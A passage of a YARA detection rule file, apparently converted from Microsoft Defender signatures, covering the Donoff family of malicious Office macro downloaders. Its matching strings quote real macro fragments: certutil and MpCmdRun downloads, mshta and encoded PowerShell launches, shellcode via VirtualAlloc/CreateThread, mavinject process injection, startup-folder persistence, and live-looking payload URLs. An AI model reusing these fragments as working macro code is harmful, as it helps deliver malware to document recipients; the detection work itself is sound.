        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "arraymain(i).date_borrowed = \"https://www." ascii //weight: 1
        $x_1_2 = "arraymain(i).date_due = \"bitly.com/asdhasdookdkwdiahsidh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757175_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA!MTB"
        threat_id = "2147757175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {63 6f 6d 31 20 3d 20 22 65 63 68 22 20 2b 20 22 6f 20 73 74 61 72 74 22 20 26 20 22 20 63 61 22 0d 0a 63 6f 6d 32 20 3d 20 22 6c 63 20 3e 3e 20 25 74 65 6d 70 25 5c 32 2e 74 78 74 22 0d 0a 63 6f 6d 33 20 3d 20 63 6f 6d 31 20 2b 20 63 6f 6d 32}  //weight: 1, accuracy: High
        $x_1_2 = "Set objshell = CreateObject(\"wscript.shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757175_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA!MTB"
        threat_id = "2147757175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Attribute VB_Name = \"NewMacros\"" ascii //weight: 1
        $x_1_2 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a [0-10] 64 65 62 75 67 4d 61 63 72 6f 44 6f 77 6e 6c 6f 61 64 0d 0a [0-10] 4d 79 4d 61 63 72 6f 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)" ascii //weight: 1
        $x_1_4 = "res = CreateThread(0, 0, addr, 0, 0, 0)" ascii //weight: 1
        $x_1_5 = {31 39 32 2e 31 36 38 2e 34 39 2e 37 39 2f 44 45 42 55 47 5f 44 4f 57 4e 4c 4f 41 44 20 74 65 73 74 2e 74 78 74 22 2c 20 76 62 48 69 64 65 29 9f 00 3d 20 53 68 65 6c 6c 28 22 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RA_2147757175_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RA!MTB"
        threat_id = "2147757175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 41 75 74 6f 43 6c 6f 73 65 28 29 0d 0a 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-31] 22 0d 0a 45 6e 64 20 53 75 62 0d 0a 50 75 62 6c 69 63 20 53 75 62 20 00 28 29}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-31] 0d 0a 00 20 3d 20 22 68 65 6c 6c 6f 22}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-31] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a [0-15] 00 2e 52 75 6e 20 [0-47] 2c 20 30 0d 0a [0-15] 4c 6f 6f 70 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 [0-31] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 73 78 6d 6c 32 2e 44 4f 4d 44 6f 63 75 6d 65 6e 74 2e 33 2e 30 22 29 0d 0a 53 65 74 20 [0-31] 20 3d 20 00 2e 43 72 65 61 74 65 45 6c 65 6d 65 6e 74 28 22 62 61 73 65 36 34 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".dataType = \"bin.base64\"" ascii //weight: 1
        $x_1_6 = {44 69 6d 20 [0-31] 0d 0a [0-15] 44 6f 20 57 68 69 6c 65 20 00 20 3c 20 32 30 0d 0a [0-15] 00 20 3d 20 00 20 2b 20 31 0d 0a [0-15] 49 66 20 00 20 3d 20 32 20 54 68 65 6e 20 45 78 69 74 20 44 6f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RF_2147757778_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RF!MTB"
        threat_id = "2147757778"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 22 20 26 20 22 2e 65 22 20 26 20 22 78 65 20 2f 73 20 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 41 4c 4c 55 53 45 52 53 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c [0-15] 2e 64 6c 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 76 69 72 6f 6e 28 22 41 4c 4c 55 53 45 52 53 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c 4c 6f 63 61 6c 20 54 65 6d 70 61 72 79 5c [0-15] 2e 65 78 22 20 26 20 22 65 20 43 4f 4d 32 5f 22}  //weight: 1, accuracy: Low
        $x_1_3 = " = CreateProcessA(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_YE_2147758281_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.YE!MTB"
        threat_id = "2147758281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f 61 78 61 73 [0-22] 73 6f 64 6b 61 6f 73}  //weight: 1, accuracy: Low
        $x_1_2 = {68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f 61 73 [0-32] 6f 73}  //weight: 1, accuracy: Low
        $x_1_3 = "Function calc4" ascii //weight: 1
        $x_1_4 = "createobject(\"wscript.shell\").execlulli" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_KSH_2147758433_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.KSH!MSR"
        threat_id = "2147758433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".mp/agkaoskasfksakdamskdokasdkasodkaos" ascii //weight: 1
        $x_1_2 = "msgbox\"fileiscorrupt\"createobject(\"wscript.shell\").execmainendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_KSH_2147758433_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.KSH!MSR"
        threat_id = "2147758433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "chr(log(5.9900343330481e+56)/log(3))&_\"s\"&_\"crip\"&_chr(sqr(13456))&_\".\"&_chr(sqr(13225))&_\"h\"&_\"e\"&_\"l\"&_chr(log(3.38139191352273e+51)/log(3))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147759379_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G!MSR"
        threat_id = "2147759379"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sheets(\"vMYVb\").Cells(134, 8).Value" ascii //weight: 1
        $x_1_2 = "Shell Mohair" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147759379_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G!MSR"
        threat_id = "2147759379"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "skapiska = Environ(\"Tem\" & \"p\")" ascii //weight: 1
        $x_1_2 = {70 6f 70 33 72 2e 52 75 6e 20 73 6b 61 70 69 73 6b 61 20 26 20 [0-9] 2e 54 61 67 2c 20 30 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {46 69 6c 65 43 6f 70 79 20 [0-9] 2e 4c 61 62 65 6c 31 2e 54 61 67 2c 20 73 6b 61 70 69 73 6b 61}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147759379_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G!MSR"
        threat_id = "2147759379"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "& \"C\" & Chr(52) & \"A\" & Chr((Val(\"" ascii //weight: 1
        $x_1_2 = "\")) + 68) & \"w\" & Chr((Len(\"AO\\\") + Val(\"" ascii //weight: 1
        $x_1_3 = ") + 48) & Chr(65) & \"C\" & \"4\" & Chr(65) & \"V\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_S_2147760588_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.S!MSR"
        threat_id = "2147760588"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 48 74 [0-4] 22 20 26 20 22 [0-6] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 54 65 6d 70 20 3d 20 53 74 72 54 65 6d 70 20 26 20 22 [0-4] 70 73}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 74 2e 41 72 67 75 6d 65 6e 74 73 20 3d 20 53 74 72 4c 50 20 26 [0-52] 20 22 [0-4] 4d 53 22 20 26 20 53 74 72 54 65 6d 70 20 26 20 22 [0-2] 62 69 74 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SV_2147760589_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SV!MSR"
        threat_id = "2147760589"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"C:\\User\" & \"s\\Pub\" & \"lic\\View.l\" & \"nk\"" ascii //weight: 1
        $x_1_2 = "so.TargetPath = \"msht\" & \"a.e\" & \"xe\"" ascii //weight: 1
        $x_1_3 = "so.Arguments = \"htt\" & \"ps://bit\" & \".\" & \"ly/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RBS_2147760619_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RBS!MTB"
        threat_id = "2147760619"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 77 73 63 72 69 70 74 20 [0-19] 2e 76 62 73 22}  //weight: 1, accuracy: Low
        $x_1_2 = {77 77 77 2e 77 68 65 72 65 76 65 72 2e 63 6f 6d 2f 66 69 6c 65 73 2f 70 61 79 6c 6f 61 64 2e 65 78 65 22 2c 20 22 43 3a 5c 74 65 6d 70 22 43 00 48 54 54 50 44 6f 77 6e 6c 6f 61 64 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "WScript.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "WshShell.Run \"c:\\temp\\payload.exe\"" ascii //weight: 1
        $x_1_5 = "Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RU_2147760629_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RU!MTB"
        threat_id = "2147760629"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "Environment(\"process\").Item(\"param1\") = " ascii //weight: 1
        $x_1_3 = "E6sizX8Z.run \"cmd /c call %param1%\", 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RU_2147760629_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RU!MTB"
        threat_id = "2147760629"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"powershell -noP -sta -w 1 -enc" ascii //weight: 1
        $x_1_2 = {20 2b 20 22 41 70 41 48 77 41 53 51 42 46 41 46 67 41 22 0d 0a [0-31] 53 65 74 20 [0-7] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a [0-31] 01 2e 52 75 6e 20 28 76 58 6f 79 45 58 4e 74 58 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_YG_2147761208_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.YG!MTB"
        threat_id = "2147761208"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "payload = \"xxx$69=vno?szp~{xmra{z|u}wxo!%@%=.,m%7/" ascii //weight: 1
        $x_1_2 = "exe.reppord_lanrete/moc.xewrebyc.cnc//:sptth" ascii //weight: 1
        $x_1_3 = "StrReverse(\"2vmic\\toor\\.\\:stmgmniw\")" ascii //weight: 1
        $x_1_4 = "StrReverse(\"putratSssecorP_23niW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_YH_2147761371_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.YH!MTB"
        threat_id = "2147761371"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://rebrand.ly/ohxnqak" ascii //weight: 1
        $x_1_2 = "Shell \"C:\\Users\\Public\\crscss.exe" ascii //weight: 1
        $x_1_3 = "Function vCENlg(URL, path) As Boolean" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_YI_2147761416_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.YI!MTB"
        threat_id = "2147761416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://51.255.155.1/pages/filecloud/5e2d7b130cf4feb03023e580b3432fa9d71d7838.exe" ascii //weight: 1
        $x_1_2 = "Object = CreateObject(\"WScript.Shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call Shell(\"cmd.exe  /c C:\\Program Files\\Windows Defender\\MpCmdRun.exe -DownloadFile -url http://0.0.0.0/as.exe -path C:\\%temp%\\as.exe\")" ascii //weight: 1
        $x_1_2 = "Wshell.Run Chr(34) & \"virus.vbs\" & Chr(34), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {61 70 69 2e 69 70 69 66 79 2e 6f 72 67 2f 3f 66 6f 72 6d 61 74 3d 6a 73 6f 6e 2f 00 68 74 74 70 73 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_2 = " = \"C:\\Users\\\" & Application.UserName & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system.ps1\"" ascii //weight: 2
        $x_1_3 = ".Exec(\"calc\")" ascii //weight: 1
        $x_1_4 = "\"Base64Decode\", \"Bad character In Base64 string.\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run \"cmd /c copy /b %systemroot%\\system32\\certut*.exe \" &" ascii //weight: 1
        $x_1_2 = "\\DriverGFXCoin.tmp\"" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" ascii //weight: 1
        $x_1_4 = ".Run \"cmd /c mavinject.exe \" & objItem.ProcessID & \" /injectrunning \" &" ascii //weight: 1
        $x_1_5 = "(\"Select * from Win32_Process where name='explorer.exe'\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bABBAEgAZwBBAFoAUQBBAG4AQQBDAEEAQQBKAEEAQgByAEEARABZAEEATgB3AEIAZgBBAEQASQBBAE8AdwBBAE4AQQBBAG8AQQBmAFEAQgBqAEEARwBFAEEAZABBAEIAagBBAEcAZwBBAGUAdwBCADkAQQBBAD0APQAiACkAKQB8AGkAZQB4AA==" ascii //weight: 1
        $x_1_2 = "agBBAEgAQQBBAFcAZwBCAFYAQQBHAFkAQQBVAHcAQgBoAEEARgBBAEEAVgBBAEIAUABBAEcAcwBBAGEAdwBBADcAQQBBADAAQQBDAGcAQQBOAEEAQQBvAEEAZgBRAEEATgBBAEEAbwBBAFkAdwBCAGgAQQBIAFEAQQBZAHcAQgBvAEEASABzAEEAZgBRAEEAPQAiACkAKQB8AGkAZQBYAA==" ascii //weight: 1
        $x_1_3 = ".Run(" ascii //weight: 1
        $x_1_4 = " = CreateObject(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 57 69 74 68 55 52 4c 6c 69 6e 6b 28 29 0d 0a [0-15] 27 55 52 4c 6c 69 6e 6b 2c 20 46 69 6c 65 6e 61 6d 65 0d 0a [0-15] 64 6f 77 6e 6c 6f 61 64 66 69 6c 65 20 77 77 77 2e 67 6f 6f 67 6c 65 2e 63 6f 6d 2f [0-7] 2d [0-7] 2d [0-7] 2e 64 6f 63 78 2c 20 22 77 6f 72 64 66 69 6c 65 6e 61 6d 65 2e 64 6f 63 78 22 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 73 69 6e 44 6f 63 22 0d 0a 53 75 62 20 67 65 6e 49 28 29 0d 0a 4f 70 65 6e 20 22 76 62 49 6e 69 74 52 65 6d 6f 76 65 2e 68 74 61 22 20 26 20 6f 50 6f 69 6e 74 65 72 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 0d 0a 50 72 69 6e 74 20 23 31 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 0d 0a 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: High
        $x_1_3 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 61 72 72 61 79 42 42 6f 72 64 65 72 22 0d 0a 53 75 62 20 69 6e 69 74 56 62 61 28 29 0d 0a 4f 70 65 6e 20 22 64 6f 63 42 6f 72 64 65 72 57 69 6e 2e 68 74 61 22 20 26 20 62 75 74 74 54 65 6d 70 6c 61 74 65 48 65 61 64 65 72 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 0d 0a 50 72 69 6e 74 20 23 31 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 0d 0a 43 6c 6f 73 65 20 23 31 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147761950_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R!MTB"
        threat_id = "2147761950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetCSV \"https://www.cjoint.com/doc/21_05/KECrgxzbO83_protect.cmd\", \"C:\\toto\\protect.cmd\"" ascii //weight: 1
        $x_1_2 = "GetCSV \"https://www.cjoint.com/doc/21_05/KECrgxzbO83_protect.cmd\", \"C:\\ProgramData\\protect.cmd\"" ascii //weight: 1
        $x_1_3 = "GetCSV \"https://www.cjoint.com/doc/21_05/KECqUGPmWF3_xmle.bat\", \"C:\\ProgramData\\xmle.bat\"" ascii //weight: 1
        $x_1_4 = "GetCSV \"https://www.cjoint.com/doc/21_05/KECqGZsc883_dControl.oui\", \"C:\\ProgramData\\dControl.exe\"" ascii //weight: 1
        $x_1_5 = "GetCSV \"https://www.cjoint.com/doc/21_05/KECngU7yVW3_RunNHide.oui\", \"C:\\ProgramData\\RunNHide.exe\"" ascii //weight: 1
        $x_1_6 = "GetCSV \"https://www.cjoint.com/doc/21_05/KEFujtii2zh_uz2.vbs\", \"C:\\ProgramData\\uz2.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_YJ_2147762162_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.YJ!MTB"
        threat_id = "2147762162"
        type = "TrojanDownloader"
